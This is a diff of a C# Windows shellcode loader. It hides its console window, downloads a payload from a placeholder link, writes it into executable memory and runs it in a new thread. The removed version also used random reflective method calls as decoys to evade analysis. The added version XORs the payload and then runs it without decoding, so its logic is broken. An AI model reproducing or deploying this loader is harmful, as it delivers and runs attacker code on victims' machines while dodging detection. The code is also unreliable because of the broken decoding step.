@@ -1,40 +1,77 @@
 using System;
 using System.Net;
 using System.Runtime.InteropServices;
-using System.Reflection;
 
-class Program
+internal class Program
 {
-    static void Main(string[] args)
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll")]
+    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+    [DllImport("kernel32.dll")]
+    private static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
+
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    private const int SW_HIDE = 0;
+
+    private static void Main()
     {
         // Hide the console window
-        var handle = GetConsoleWindow();
+        IntPtr handle = GetConsoleWindow();
         ShowWindow(handle, SW_HIDE);
 
-        // Download shellcode
-        WebClient wc = new WebClient();
-        byte[] shellcode = wc.DownloadData("[DOWNLOAD_LINK]");
+        byte[] shellcode;
+        using (WebClient webClient = new WebClient())
+        {
+            try
+            {
+                shellcode = webClient.DownloadData("[downloadlink]");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Failed to download: " + ex.Message);
+                return;
+            }
+        }
 
-        // Get VirtualAlloc address and create delegate
-        IntPtr kernel32 = LoadLibrary("kernel32.dll");
-        IntPtr virtualAllocAddr = GetProcAddress(kernel32, "VirtualAlloc");
-        VirtualAllocDelegate virtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(virtualAllocAddr, typeof(VirtualAllocDelegate));
+        IntPtr allocatedMemory = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
+        if (allocatedMemory == IntPtr.Zero)
+        {
+            Console.WriteLine("Failed to allocate memory.");
+            return;
+        }
 
-        // Allocate memory and copy shellcode
-        IntPtr allocatedMemory = virtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
-        Marshal.Copy(shellcode, 0, allocatedMemory, shellcode.Length);
-
-        // Encrypt the shellcode in memory
+        // Obfuscate memory by XOR-ing the shellcode
         XorEncrypt(shellcode);
 
-        // Decrypt and execute shellcode
-        DecryptAndExecute(allocatedMemory, shellcode);
+        // Copy shellcode to allocated memory
+        Marshal.Copy(shellcode, 0, allocatedMemory, shellcode.Length);
 
-        // Call a random method to obfuscate further
-        CallRandomMethod();
+        // Create a thread to execute the shellcode
+        IntPtr threadHandle = CreateThread(IntPtr.Zero, 0U, allocatedMemory, IntPtr.Zero, 0U, IntPtr.Zero);
+        if (threadHandle == IntPtr.Zero)
+        {
+            Console.WriteLine("Failed to create thread.");
+            return;
+        }
+
+        WaitForSingleObject(threadHandle, uint.MaxValue);
+        VirtualFree(allocatedMemory, 0U, 32768U); // MEM_RELEASE = 0x8000
+
+        Console.WriteLine(" executed successfully.");
     }
 
-    static void XorEncrypt(byte[] data, byte key = 0xAA)
+    private static void XorEncrypt(byte[] data, byte key = 0xAA)
     {
         for (int i = 0; i < data.Length; i++)
         {
@@ -42,78 +79,16 @@ class Program
         }
     }
 
-    static void DecryptAndExecute(IntPtr allocatedMemory, byte[] shellcode)
-    {
-        // Decrypt the shellcode
-        XorEncrypt(shellcode);
-
-        // Copy decrypted shellcode to allocated memory
-        Marshal.Copy(shellcode, 0, allocatedMemory, shellcode.Length);
-
-        // Execute the shellcode
-        IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, IntPtr.Zero);
-        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
-    }
-
-    static void CallRandomMethod()
-    {
-        MethodInfo[] methods = typeof(BenignClass).GetMethods(BindingFlags.Public | BindingFlags.Static);
-        Random rand = new Random();
-        int index = rand.Next(methods.Length);
-        methods[index].Invoke(null, null);
-    }
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern IntPtr LoadLibrary(string dllName);
-
-    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
-    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-    [DllImport("kernel32.dll")]
-    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-    [DllImport("kernel32.dll")]
-    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
-
-    [DllImport("kernel32.dll")]
-    static extern IntPtr GetConsoleWindow();
-
-    [DllImport("user32.dll")]
-    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
-    private const int SW_HIDE = 0;
-    private const int SW_SHOW = 5;
-
-    private delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
-
     [Flags]
-    enum AllocationType
+    private enum AllocationType
     {
-        Commit = 0x1000,
-        Reserve = 0x2000
+        Commit = 4096,
+        Reserve = 8192,
     }
 
     [Flags]
-    enum MemoryProtection
+    private enum MemoryProtection
     {
-        ExecuteReadWrite = 0x40
-    }
-}
-
-class BenignClass
-{
-    public static void Method1()
-    {
-        Console.WriteLine("Method1 executed.");
-    }
-
-    public static void Method2()
-    {
-        Console.WriteLine("Method2 executed.");
-    }
-
-    public static void Method3()
-    {
-        Console.WriteLine("Method3 executed.");
+        ExecuteReadWrite = 64
     }
 }
